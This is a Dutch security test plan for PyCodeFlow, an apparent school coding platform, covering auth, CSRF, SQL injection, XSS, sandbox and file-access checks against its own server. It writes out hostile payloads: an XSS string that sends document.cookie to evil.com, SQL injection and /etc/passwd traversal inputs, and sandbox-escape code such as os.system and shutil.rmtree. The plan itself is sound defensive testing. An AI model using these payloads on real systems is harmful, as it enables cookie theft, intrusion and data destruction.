# PyCodeFlow — Security Testplan

> **Versie:** v2026.2.42.0 · **Bijgewerkt:** 27 juni 2026
> Ghost-testplan: alle beveiligingslagen systematisch testen.
> Uitvoeren op: `https://app.pycodeflow.org` (productie) of lokaal via `http://localhost:3000`
>
> **Notatie:**
> `✅ PASS` = verwacht gedrag (aanval geblokkeerd / beveilig correct)
> `❌ FAIL` = beveiligingsprobleem gevonden → melden als kritieke bug
> `⚠️ NOTA` = opmerking of aandachtspunt, geen directe kwetsbaarheid

---

## 1. Authenticatie & Toegangscontrole

### 1.1 Directe toegang zonder inlog

Test: probeer beveiligde pagina's en endpoints te bereiken zonder cookie.

```bash
# Beveiligde HTML-pagina's
curl -sv http://localhost:3000/admin.html         2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/monitoring.html    2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/quiz-bank.html     2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/quiz-teacher.html  2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/quiz-review.html   2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/teacher-sessions.html 2>&1 | grep "HTTP/\|Location:"
curl -sv http://localhost:3000/teacher-app.html   2>&1 | grep "HTTP/\|Location:"

# Verwacht: ✅ HTTP 401 of redirect naar /teacher-login.html
```

```bash
# Beveiligde API-endpoints
curl -s http://localhost:3000/api/system-stats
curl -s http://localhost:3000/api/admin/students
curl -s http://localhost:3000/api/quiz/bank
curl -s http://localhost:3000/api/admin/db/tables

# Verwacht: ✅ HTTP 401 of {"error":"Authenticatie vereist"}
```

### 1.2 Rate limiting op login

```bash
# 6 foutieve pogingen — daarna blokkering
for i in $(seq 1 8); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/api/teacher-login \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"fout'$i'"}')
  echo "Poging $i: HTTP $CODE"
done

# Verwacht:
# ✅ Pogingen 1-6: HTTP 401
# ✅ Pogingen 7-8: HTTP 429 "Te veel mislukte loginpogingen"
```

```bash
# Na blokkering: wacht 60s of herstart server — controleer reset
sleep 65
curl -s -w "%{http_code}" -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"ClaesAdmin","password":"juist_wachtwoord"}'
# Verwacht: ✅ HTTP 200 na reset
```

### 1.3 Timing-safe wachtwoordvergelijking

```bash
# Meet tijdsverschil tussen bestaande en niet-bestaande gebruiker
time curl -s -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"ClaesAdmin","password":"fout"}'

time curl -s -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"BESTAAT_NIET","password":"fout"}'

# Verwacht: ✅ Tijdsverschil < 50ms (safeEqual + scrypt gebruiken vaste tijd)
# ❌ FAIL als bestaande gebruiker beduidend sneller/trager reageert (user enumeration)
```

### 1.4 Cookie-beveiliging

```bash
curl -sv -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"ClaesAdmin","password":"JouwWachtwoord"}' 2>&1 | grep -i "set-cookie"

# Verwacht:
# ✅ teacher_auth=...; HttpOnly aanwezig (geen JS-toegang)
# ✅ SameSite=Strict aanwezig (CSRF-bescherming op cookie-niveau)
# ✅ Secure aanwezig in productie (via Cloudflare HTTPS)
# ❌ FAIL als HttpOnly of SameSite=Strict ontbreekt
```

### 1.5 Cookie manipulatie

```bash
# Gebruik een vervalst cookie
curl -s http://localhost:3000/api/system-stats \
  -H "Cookie: teacher_auth=nep_waarde_123"

# Verwacht: ✅ HTTP 401 — nep cookie wordt geweigerd

# Gebruik een echte cookie maar met 1 karakter gewijzigd
REAL_COOKIE=$(curl -s -c - -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"ClaesAdmin","password":"JouwWachtwoord"}' | grep teacher_auth | awk '{print $NF}')
FAKE="${REAL_COOKIE::-1}X"
curl -s -w "%{http_code}" http://localhost:3000/api/system-stats \
  -H "Cookie: teacher_auth=$FAKE"
# Verwacht: ✅ HTTP 401
```

### 1.6 Uitloggen

```bash
# Haal geldig cookie op
COOKIE=$(curl -s -c /tmp/jar.txt -X POST http://localhost:3000/api/teacher-login \
  -H "Content-Type: application/json" \
  -d '{"username":"ClaesAdmin","password":"JouwWachtwoord"}' 2>/dev/null)

# Gebruik cookie — moet werken
curl -s -w "%{http_code}" -b /tmp/jar.txt http://localhost:3000/api/system-stats

# Uitloggen
curl -s -b /tmp/jar.txt http://localhost:3000/api/teacher-logout

# Gebruik cookie opnieuw — mag niet meer werken
curl -s -w "%{http_code}" -b /tmp/jar.txt http://localhost:3000/api/system-stats

# Verwacht: ✅ Eerste aanroep 200, na logout 401
```

---

## 2. CSRF-beveiliging

### 2.1 Muterende requests zonder CSRF-token

```bash
# Haal geldig auth-cookie op (vereist voor test)
AUTH_COOKIE="teacher_auth=JOUW_GELDIG_COOKIE"

# POST zonder X-CSRF-Token header
curl -s -w "\nHTTP: %{http_code}" \
  -H "Cookie: $AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -X POST http://localhost:3000/api/admin/students \
  -d '{"name":"Test","classId":null}'

# Verwacht: ✅ HTTP 403 "CSRF token mist of ongeldig"
```

```bash
# POST met fout CSRF-token
curl -s -w "\nHTTP: %{http_code}" \
  -H "Cookie: $AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: nep_token_xyz" \
  -X POST http://localhost:3000/api/admin/students \
  -d '{"name":"Test","classId":null}'

# Verwacht: ✅ HTTP 403
```

```bash
# Correcte flow: haal CSRF-token op en gebruik hem
CSRF=$(curl -s -b "$AUTH_COOKIE" http://localhost:3000/api/csrf-token | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
curl -s -w "\nHTTP: %{http_code}" \
  -H "Cookie: $AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF" \
  -X POST http://localhost:3000/api/admin/students \
  -d '{"name":"GhostTest","classId":null}'

# Verwacht: ✅ HTTP 200 met CSRF-token
```

### 2.2 Cross-origin request simulatie

```python
# Simuleer een aanvraag van een andere origin (alsof een kwaadaardige site)
import requests
r = requests.post('http://localhost:3000/api/admin/students',
    headers={
        'Content-Type': 'application/json',
        'Origin': 'https://kwaadaardig.example.com',
        'Cookie': 'teacher_auth=JOUW_GELDIG_COOKIE',
    },
    json={'name': 'Hack', 'classId': None}
)
print(r.status_code, r.text[:100])
# Verwacht: ✅ HTTP 403 (geen X-CSRF-Token in cross-origin POST)
```

---

## 3. HTTP Beveiligingsheaders

```bash
curl -sI https://app.pycodeflow.org | grep -iE \
  "content-security|x-frame|x-content|strict-transport|referrer"

# Verwacht:
# ✅ content-security-policy:
#      script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com
#      unsafe-eval NIET aanwezig
#      worker-src 'self' blob:
#      frame-ancestors 'none'
# ✅ x-frame-options: DENY
# ✅ x-content-type-options: nosniff
# ✅ strict-transport-security aanwezig (HSTS, via Cloudflare)
# ❌ FAIL als unsafe-eval aanwezig is in script-src
# ❌ FAIL als frame-ancestors ontbreekt of 'self' toestaat
```

```bash
# Controleer dat CDN-scripts alleen van cdnjs.cloudflare.com geladen worden
curl -s https://app.pycodeflow.org/quiz-bank.html | grep "script src" | grep -v "cdnjs.cloudflare.com\|/app.js\|/monaco"
# Verwacht: ✅ Geen externe scripts van onbekende domeinen
```

---

## 4. SQL-injectie

### 4.1 DB viewer whitelist

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"
CSRF=$(curl -s -b "$AUTH_COOKIE" http://localhost:3000/api/csrf-token | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Tabelnamen buiten whitelist
for payload in \
  "teachers; DROP TABLE teachers--" \
  "../etc/passwd" \
  "1 OR 1=1" \
  "'; SELECT * FROM teachers--" \
  "nonexistent_table" \
  "__proto__" \
  "constructor"
do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$AUTH_COOKIE" \
    -H "X-CSRF-Token: $CSRF" \
    "http://localhost:3000/api/admin/db/tables/$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")/rows")
  echo "Payload '$payload': HTTP $CODE"
done
# Verwacht: ✅ HTTP 403 "Tabel niet toegestaan" voor alle bovenstaande
```

### 4.2 Zoekparameter injectie in DB viewer

```bash
# SQL-injectie via search parameter
curl -s -b "$AUTH_COOKIE" \
  "http://localhost:3000/api/admin/db/tables/teachers/rows?search=' OR '1'='1" | python3 -m json.tool

# Verwacht: ✅ Resultaat is normale gefilterde data of leeg
# ✅ Geen foutmelding met SQL-syntax zichtbaar
# ✅ Geen extra rijen door injectie (geparametriseerde query)
```

### 4.3 Parametriseerde queries in database.js

```bash
# Controleer dat alle queries geparametriseerd zijn (geen string concatenatie)
grep -n "query(\`\|query(\"" /home/claude/PyCodeFlow-app/web/db/database.js | \
  grep -v "'\$[0-9]\|, \[" | head -20

# Verwacht: ✅ Alle dynamische waarden via $1, $2, ... parameters
# ❌ FAIL als er query(`... ${userInput} ...`) zonder parameters staat
```

---

## 5. Cross-Site Scripting (XSS)

### 5.1 Opgeslagen XSS via vraagstelling

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"
CSRF=$(curl -s -b "$AUTH_COOKIE" http://localhost:3000/api/csrf-token | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Probeer XSS-payload op te slaan als vraagstelling
curl -s -b "$AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF" \
  -X POST http://localhost:3000/api/quiz/bank \
  -d '{"text":"<script>alert(\"XSS\")</script>","questionType":"code","maxPoints":4}'

# Open quiz-bank.html in browser
# Verwacht: ✅ Script-tag getoond als tekst, NIET uitgevoerd
# ✅ Geen popup zichtbaar
# ✅ Broncode toont &lt;script&gt; (geëscaped via esc())
```

### 5.2 XSS via leerlingnaam

```bash
# Sla XSS op als leerlingnaam
curl -s -b "$AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF" \
  -X POST http://localhost:3000/api/admin/students \
  -d '{"name":"<img src=x onerror=alert(1)>","classId":null}'

# Open admin.html → Leerlingen tab
# Verwacht: ✅ Naam getoond als tekst "<img...>", afbeelding-tag NIET geladen
# ✅ Geen alert popup
```

### 5.3 XSS via sessienaam

```bash
# Probeer sessie aan te maken met XSS-naam
curl -s -b "$AUTH_COOKIE" \
  -H "Content-Type: application/json" \
  -H "X-CSRF-Token: $CSRF" \
  -X POST http://localhost:3000/api/sessions \
  -d '{"name":"<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>","mode":"class"}'

# Open teacher-sessions.html
# Verwacht: ✅ Sessienaam getoond als escaped tekst
# ✅ Cookie NIET gelekt (ook bij uitvoering: HttpOnly)
```

### 5.4 Reflected XSS via URL-parameters

```
# In browser: navigeer naar:
http://localhost:3000/quiz-student.html?code=<script>alert(1)</script>&name=Test
http://localhost:3000/quiz-review.html?code="><script>alert(1)</script>

# Verwacht: ✅ Script-tag escaped of genegeerd
# ✅ Geen popup zichtbaar
```

### 5.5 Markdown XSS in vraagstelling

```
# In quiz-bank → Nieuwe vraag, typ in textarea:
[klik hier](javascript:alert(1))
<a href="javascript:alert(1)">klik</a>
![img](x" onerror="alert(1))

# Open preview of kaartweergave
# Verwacht:
# ✅ javascript: href wordt niet uitgevoerd of gerenderd als tekst
# ✅ onerror attribuut niet uitgevoerd
# ⚠️ NOTA: marked.js sanitiseert standaard niet — controleer of DOMPurify of sanitize-optie actief is
```

---

## 6. Python Code Execution — Sandbox

### 6.1 Verboden module-imports

Test in de leerlingeditor (student-app.html of free-editor.html):

```python
# Test 1: OS-module
import os
print(os.listdir('/'))
# Verwacht: ✅ ImportError "Module 'os' is niet toegestaan"

# Test 2: Subprocess
import subprocess
subprocess.run(['ls'])
# Verwacht: ✅ Geblokkeerd

# Test 3: Socket (netwerktoegang)
import socket
s = socket.socket()
# Verwacht: ✅ Geblokkeerd

# Test 4: Bestandssysteem via open()
with open('/etc/passwd', 'r') as f:
    print(f.read())
# Verwacht: ✅ Geblokkeerd of lege output (rlimit FSIZE)

# Test 5: Shutil
import shutil
shutil.rmtree('/tmp')
# Verwacht: ✅ Geblokkeerd

# Test 6: Importlib (omzeiling via importlib)
import importlib
os = importlib.import_module('os')
print(os.getcwd())
# Verwacht: ✅ Geblokkeerd — _safe_import onderschept dit

# Test 7: __import__ omzeiling
os = __import__('os')
# Verwacht: ✅ Geblokkeerd — builtins.__import__ is vervangen

# Test 8: eval/exec omzeiling
eval("import os; os.system('ls')")
# Verwacht: ✅ Geblokkeerd of os-import gefaald

# Test 9: sys module
import sys
sys.exit(0)
# Verwacht: ✅ sys.exit() heeft geen effect buiten sandbox

# Test 10: Toegang tot __builtins__ manipulatie
__builtins__.__import__ = lambda *a, **k: None
import os
# Verwacht: ✅ Sandbox reset — aanpassing heeft geen effect
```

### 6.2 Resource limits

```python
# Test CPU/time limit
while True:
    pass
# Verwacht: ✅ Na ~5s: "Tijdslimiet overschreden" + SIGKILL

# Test geheugen
x = []
while True:
    x.append(' ' * 10**6)
# Verwacht: ✅ MemoryError of process wordt gekilled

# Test te veel bestanden openen (RLIMIT_NOFILE = 64)
files = [open('/dev/null') for _ in range(100)]
# Verwacht: ✅ OSError: Too many open files na ~64

# Test te veel processen aanmaken (RLIMIT_NPROC = 32)
import os
for _ in range(50):
    os.fork()
# Verwacht: ✅ Geblokkeerd (os-module geblokkeerd voor dit punt)

# Test grote output (output truncation)
print('A' * 10**7)
# Verwacht: ✅ Output afgekapt of process gestopt
```

### 6.3 Netwerktoegang vanuit runner

```bash
# Runner container mag geen extern netwerk bereiken
docker exec pycodeflow-runner-1 python3 -c "
import urllib.request
urllib.request.urlopen('http://example.com', timeout=3)
print('NETWERK BEREIKBAAR — BEVEILIGINGSPROBLEEM')
" 2>&1

# Verwacht: ✅ ConnectionError of urllib niet beschikbaar
# ⚠️ NOTA: als urllib wel werkt, verifieer dat socket geblokkeerd is in _safe_import
```

### 6.4 Rate limiting op code-runs

```javascript
// Uitvoeren in browser console op student-app.html:
const socket = io();
let count = 0;
const interval = setInterval(() => {
    socket.emit('run_code', { code: 'print(1)', sessionCode: 'TESTCODE' });
    count++;
    if (count >= 25) clearInterval(interval);
}, 100); // 25 runs in 2.5 seconden

// Verwacht: ✅ Na ~5 runs: run_rate_limited event ontvangen
// ✅ Browser toont "Te snel" melding
```

---

## 7. Database viewer beveiliging (sprint 24g)

### 7.1 Toegang zonder auth

```bash
curl -s -w "\nHTTP: %{http_code}" http://localhost:3000/api/admin/db/tables
curl -s -w "\nHTTP: %{http_code}" http://localhost:3000/api/admin/db/tables/teachers/rows
# Verwacht: ✅ HTTP 401 of redirect
```

### 7.2 Tabelnamen buiten whitelist

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"

for tabel in \
  "pg_user" \
  "pg_shadow" \
  "information_schema.tables" \
  "../../etc/passwd" \
  "teachers; SELECT * FROM teachers" \
  "TEACHERS" \
  "teachers--"
do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -b "$AUTH_COOKIE" \
    "http://localhost:3000/api/admin/db/tables/$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$tabel")/rows")
  echo "$tabel → HTTP $CODE"
done
# Verwacht: ✅ HTTP 403 voor alle bovenstaande
```

### 7.3 Gevoelige kolommen gemaskeerd

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"
curl -s -b "$AUTH_COOKIE" \
  "http://localhost:3000/api/admin/db/tables/teachers/rows" | python3 -m json.tool

# Verwacht:
# ✅ password_hash kolom toont "••••••" (niet de echte hash)
# ✅ cookie_secret (indien aanwezig) toont "••••••"
# ❌ FAIL als echte hash zichtbaar is (format: $scrypt$N=...$...)
```

---

## 8. Secrets & Configuratie

### 8.1 .env nooit in git

```bash
git -C /home/claude/PyCodeFlow-app log --all --full-history -- .env
git -C /home/claude/PyCodeFlow-app ls-files .env

# Verwacht:
# ✅ Geen output (nooit gecommit)
# ✅ .gitignore bevat .env
```

### 8.2 Geen secrets in JS/HTML

```bash
grep -rn "password\|secret\|token\|apikey\|api_key" \
  /home/claude/PyCodeFlow-app/web/public/*.html \
  /home/claude/PyCodeFlow-app/web/public/app.js | \
  grep -iv "csrf_token\|X-CSRF\|pyToast\|pyAlert\|placeholder\|comment\|//\|/*" | \
  grep -v "teacher_auth\|cookie.*name\|class.*token"

# Verwacht: ✅ Geen echte secrets in client-side code
```

### 8.3 .env.example heeft alleen placeholders

```bash
grep -E "=.+" /home/claude/PyCodeFlow-app/.env.example | grep -v "CHANGE_ME\|JOUW_\|example\|2025-\|localhost\|pycodeflow\|2026"
# Verwacht: ✅ Geen echte wachtwoorden of tokens in .env.example
```

### 8.4 Wachtwoorden gehashed in DB

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"
curl -s -b "$AUTH_COOKIE" \
  "http://localhost:3000/api/admin/db/tables/teachers/rows" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(d['rows'][0].get('password_hash','?'))"

# Verwacht:
# ✅ Waarde is "••••••" (gemaskeerd door DB viewer)
# Extra test via database.js direct:
docker exec pycodeflow-postgres-1 psql -U pycodeflow -d pycodeflow \
  -c "SELECT username, LEFT(password_hash, 20) FROM teachers LIMIT 3;"
# Verwacht: ✅ Hash begint met "$scrypt$" of "scrypt:" — NIET plaintext
```

---

## 9. Leerling-isolatie & Sessiebeveiliging

### 9.1 Leerling kan andere leerling niet zien

```bash
# Verbind als leerling A en B met dezelfde sessie
# A probeert B's code te zien via directe API-aanroep

curl -s "http://localhost:3000/api/sessions/TESTCODE/student/B_STUDENT_ID/code"
# Verwacht: ✅ HTTP 401 of 403 (geen auth = geen toegang)
# ✅ Enkel de leerkracht-interface toont leerlingcode
```

### 9.2 Leerling kan geen leerkrachtsessie overnemen

```bash
# Probeer als leerling een socket-event te sturen dat enkel voor leerkrachten is
# In browser console op student-app.html:
# socket.emit('close_session', { sessionCode: 'TESTCODE' })
# socket.emit('kick_student', { sessionCode: 'TESTCODE', studentId: 'xyz' })
# socket.emit('block_session', { sessionCode: 'TESTCODE' })

# Verwacht: ✅ Server logt "Leerkracht-authenticatie vereist" en negeert event
# ✅ Sessie NIET gesloten of leerling NIET gekickt
```

### 9.3 Sessiecodes zijn onraadbaar

```bash
# Genereer 10 sessiecodes en controleer entropie
for i in $(seq 1 10); do
  curl -s -b "$AUTH_COOKIE" -H "X-CSRF-Token: $CSRF" \
    -X POST http://localhost:3000/api/sessions \
    -H "Content-Type: application/json" \
    -d '{"name":"Entropietest","mode":"class"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('code','?'))"
done

# Verwacht:
# ✅ Codes zijn 8 tekens, alfanumeriek (A-Z, 2-9 = ~32 tekens)
# ✅ Elke code uniek
# ✅ Geen sequentiële of voorspelbare codes
# ✅ Entropie: 8 × log2(32) = 40 bits minimum
```

### 9.4 Rate limiting op leerling-join

```bash
# Probeer 15 join-pogingen per minuut te overschrijden
for i in $(seq 1 12); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/api/sessions/NEPCODE/join \
    -H "Content-Type: application/json" \
    -d '{"name":"Ghost"}')
  echo "Poging $i: HTTP $CODE"
done
# Verwacht: ✅ Na 10 pogingen per minuut: HTTP 429
```

---

## 10. Infrastructure & Transport

### 10.1 HTTPS afdwinging

```bash
# HTTP → HTTPS redirect via Cloudflare
curl -sv http://app.pycodeflow.org/ 2>&1 | grep "HTTP/\|Location:"
# Verwacht: ✅ HTTP 301/302 redirect naar https://

# TLS versie
curl -sv https://app.pycodeflow.org/ 2>&1 | grep "TLS\|SSL\|Protocol"
# Verwacht: ✅ TLSv1.2 of TLSv1.3 (geen TLS 1.0/1.1)
```

### 10.2 Clickjacking-bescherming

```html
<!-- Test in browser: probeer de app in een iframe te laden -->
<html><body>
<iframe src="https://app.pycodeflow.org/teacher-sessions.html"
        width="800" height="600"></iframe>
</body></html>

<!-- Verwacht: ✅ Iframe blijft leeg / browser weigert te laden -->
<!-- Reden: X-Frame-Options: DENY + frame-ancestors 'none' in CSP -->
```

### 10.3 Content-Type sniffing

```bash
curl -sI https://app.pycodeflow.org/app.js | grep -i "content-type\|x-content-type"
# Verwacht:
# ✅ content-type: application/javascript
# ✅ x-content-type-options: nosniff
```

### 10.4 HSTS

```bash
curl -sI https://app.pycodeflow.org | grep -i "strict-transport"
# Verwacht: ✅ strict-transport-security: max-age=... aanwezig
```

### 10.5 Cloudflare tunnel — geen directe poort-exposure

```bash
# Directe verbinding op poort 3000 van buiten (vanuit extern netwerk)
curl -sv https://app.pycodeflow.org:3000/ 2>&1 | grep "HTTP/\|refused\|timeout"
# Verwacht: ✅ Connectie geweigerd of timeout (poort 3000 niet publiek toegankelijk)

# Interne poort op NAS (vanuit LAN mag wel)
# curl http://NAS-IP:3000/  → OK (enkel intern)
```

---

## 11. Toegankelijkheid van gevoelige bestanden

### 11.1 Directe toegang tot configuratiebestanden

```bash
for path in \
  "/.env" \
  "/.gitignore" \
  "/docker-compose.yml" \
  "/package.json" \
  "/web/db/database.js" \
  "/runner/app.py" \
  "/../etc/passwd" \
  "/node_modules/express/package.json"
do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000$path")
  echo "$path → HTTP $CODE"
done

# Verwacht: ✅ HTTP 404 voor alle bovenstaande (Express serveert enkel /public/)
# ❌ FAIL als .env of database.js downloadbaar zijn
```

### 11.2 Directory traversal

```bash
for payload in \
  "/../../../etc/passwd" \
  "/..%2F..%2F..%2Fetc%2Fpasswd" \
  "/public/../../../etc/shadow" \
  "/assets/../../../../etc/passwd"
do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000$payload")
  echo "$payload → HTTP $CODE"
done
# Verwacht: ✅ HTTP 400 of 404 voor alle paden buiten /public/
```

---

## 12. Audit-log volledigheid

```bash
AUTH_COOKIE="teacher_auth=JOUW_COOKIE"

# Voer beveiligingsrelevante acties uit:
# 1. Score aanpassen in verbetermodule
# 2. Toets verwijderen
# 3. Leerkracht aanmaken/verwijderen
# 4. Resultaten vrijgeven

# Controleer daarna audit_log
curl -s -b "$AUTH_COOKIE" \
  "http://localhost:3000/api/admin/db/tables/audit_log/rows?limit=20" | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for row in d['rows']:
    print(row.get('action','?'), '|', row.get('actor','?'), '|', str(row.get('detail',''))[:60])
"

# Verwacht:
# ✅ score_changed → aanwezig met leerkrachtnaam en vraag-ID
# ✅ quiz_deleted → aanwezig met sessienaam
# ✅ results_released → aanwezig
# ✅ IP-adres gelogd per actie
# ❌ FAIL als beveiligingsrelevante acties NIET in audit_log staan
```

---

## 13. Bekende kwetsbaarheden — expliciet uitgeschakeld

| Aanval | Maatregel | Status |
|---|---|---|
| SQL-injectie | Geparametriseerde pg-queries (altijd `$1`, `$2`) | ✅ Structureel |
| XSS opgeslagen | `esc()` / `escAttr()` in alle renders | ✅ Structureel |
| XSS via Markdown | `marked.js` rendert `<script>` niet standaard | ⚠️ Verifieer DOMPurify |
| CSRF | SameSite=Strict cookie + X-CSRF-Token header | ✅ Dubbele bescherming |
| Clickjacking | X-Frame-Options: DENY + CSP frame-ancestors: none | ✅ |
| Brute force login | Rate limiting: 6 pogingen → 60s blokkering | ✅ |
| Timing attack wachtwoord | `crypto.timingSafeEqual()` via `safeEqual()` | ✅ |
| Plaintext wachtwoord | scrypt hash in DB, nooit plaintext | ✅ |
| Secrets in git | .env in .gitignore, .env.example heeft placeholders | ✅ |
| Code execution escape | Verboden modules + rlimits + SIGKILL bij timeout | ✅ Meerdere lagen |
| Container breakout | Runner in aparte Docker container, `mem_limit`, `cpus` | ✅ |
| Port exposure | Enkel Cloudflare tunnel publiek, poort 3000 intern | ✅ |
| Cookie diefstal | HttpOnly + SameSite=Strict + Secure (Cloudflare) | ✅ |
| User enumeration | Timing-safe vergelijking + zelfde foutmelding | ✅ |
| Open redirect | Geen redirect-parameter in login-flow | ✅ |
| Path traversal | Express `static` beperkt tot /public/ | ✅ |
| DB viewer misbruik | Whitelist tabelnamen + server-side maskering | ✅ |

---

## 14. Aandachtspunten & Openstaande risico's

| Nr | Risico | Ernst | Aanbeveling |
|---|---|---|---|
| R-01 | `marked.js` sanitiseert geen HTML in Markdown — `<script>` via inline HTML mogelijk | Middel | Voeg DOMPurify toe na `marked.parse()` in quiz-bank, quiz-student, quiz-review |
| R-02 | `unsafe-inline` in CSP (nodig voor inline scripts) — verzwakt XSS-bescherming | Middel | Migreer inline scripts naar externe bestanden met nonce of hash |
| R-03 | Sessiecode is 8 tekens (~40 bit entropie) — theoretisch raadbaar bij zeer veel pogingen | Laag | Rate limiting op `/api/sessions/:code/join` is actief (10/min) — voldoende |
| R-04 | CSRF-token is server-wide (één token voor alle sessies) — lekkage heeft brede impact | Laag | Per-gebruiker tokens zijn veiliger maar complexer; SameSite=Strict compenseert |
| R-05 | Runner timeout is 5s — lange but-correcte code (bv. recursie) kan afgebroken worden | Laag | Aparte timeout per vraagtype (code vs open) overwegen |
| R-06 | Audit-log slaat IP op maar geen User-Agent of sessiefingerprint | Laag | User-Agent toevoegen voor forensisch gebruik |
| R-07 | `is_teacher_preview: true` toetsen worden niet automatisch opgeschoond | Laag | Cron-job toevoegen: verwijder preview-toetsen ouder dan 24u |

---

*PyCodeFlow · Atheneum Hoboken · security-testplan.md · v2026.2.42.0 · 27 juni 2026*
*Opgesteld op basis van volledige code-audit van server.js, database.js, runner/app.py en alle HTML-pagina's.*
